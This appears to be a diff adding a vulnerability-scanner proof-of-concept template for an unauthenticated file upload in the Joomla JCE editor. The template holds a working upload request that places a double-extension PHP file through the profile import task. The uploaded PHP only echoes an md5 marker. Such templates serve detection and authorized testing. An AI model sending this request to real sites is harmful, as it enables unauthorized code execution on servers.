@@ -1,0 +1,36 @@
+name: poc-yaml-joomla-jce-file-upload
+set:
+  r1: randomLowercase(8)
+groups:
+  detect:
+    - method: GET
+      path: /plugins/editors/jce/jce.xml
+      follow_redirects: false
+      expression: >
+        response.status == 200 && response.body.bcontains(b"<version>") && response.body.bcontains(b"jce")
+  profile-import:
+    - method: POST
+      path: /index.php?option=com_jce
+      headers:
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundary{{r1}}
+      body: >-
+        ------WebKitFormBoundary{{r1}}
+        Content-Disposition: form-data; name="task"
+
+        profiles.import
+        ------WebKitFormBoundary{{r1}}
+        Content-Disposition: form-data; name="profile_file"; filename="{{r1}}.xml.php"
+        Content-Type: application/xml
+
+        <?php echo md5("jce_test_{{r1}}"); ?>
+        ------WebKitFormBoundary{{r1}}--
+      follow_redirects: false
+      expression: >
+        response.status == 200 && (response.body.bcontains(b"imported successfully") || response.body.bcontains(b"success"))
+detail:
+  author: L4xy
+  description: "Joomla JCE Editor <=2.9.99.4存在未授权任意文件上传漏洞(CVE-2026-48907)，攻击者可通过profile import功能上传恶意PHP文件到tmp目录，或通过browser plugin上传到images目录，导致远程代码执行"
+  links:
+    - https://github.com/ynsmroztas/JoomlaSniper
+    - https://nvd.nist.gov/vuln/detail/CVE-2026-48907
+  tags: file-upload,rce,joomla,jce
